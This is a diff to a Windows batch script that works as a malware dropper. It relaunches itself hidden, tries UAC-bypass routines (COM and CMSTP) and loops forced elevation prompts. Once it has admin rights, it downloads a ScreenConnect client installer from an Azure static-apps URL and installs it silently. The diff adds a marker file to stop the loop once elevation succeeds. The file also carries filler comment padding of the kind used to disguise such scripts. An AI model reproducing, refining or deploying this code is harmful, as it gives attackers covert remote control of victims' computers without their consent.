@@ -6,17 +6,23 @@ if /i not "%~1"=="x" (
   powershell -nop -w hidden -c "Start-Process -FilePath '%~f0' -ArgumentList 'x' -WindowStyle Hidden"
   exit /b
 )
+set "ELEV_MARKER=%TEMP%\jjjj.elevated"
+del /f /q "%ELEV_MARKER%" >nul 2>nul
 net session >nul 2>&1
 if not errorlevel 1 goto :ADMIN
 call :TRY_COM
+if exist "%ELEV_MARKER%" exit /b 0
 net session >nul 2>&1
 if not errorlevel 1 goto :ADMIN
 call :TRY_CMSTP
+if exist "%ELEV_MARKER%" exit /b 0
 net session >nul 2>&1
 if not errorlevel 1 goto :ADMIN
 :FORCE_ELEV
+if exist "%ELEV_MARKER%" exit /b 0
 powershell -nop -w hidden -c "$p='%~f0';$s=New-Object -ComObject Shell.Application;$s.ShellExecute($p,'/elevate','','runas',0)"
 timeout /t 4 /nobreak >nul 2>nul
+if exist "%ELEV_MARKER%" exit /b 0
 net session >nul 2>&1
 if errorlevel 1 goto :FORCE_ELEV
 goto :ADMIN
@@ -58,6 +64,8 @@ del /f /q "%INF%" >nul 2>nul
 exit /b 0
 
 :ADMIN
+set "ELEV_MARKER=%TEMP%\jjjj.elevated"
+echo.>"%ELEV_MARKER%"
 setlocal EnableExtensions
 set "MSI=C:\Windows\Temp\Installer_0.msi"
 set "SCURL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
@@ -74,10 +82,6 @@ del /f /q "%PSDL%" >nul 2>nul
 powershell -nop -w hidden -c "exit (Start-Process msiexec -Wait -PassThru -WindowStyle Hidden -ArgumentList '/i','%MSI%','/qn','/norestart').ExitCode"
 endlocal
 exit /b
-REM CDRPPAD ................................................................
-REM CDRPPAD ................................................................
-REM CDRPPAD ................................................................
-REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
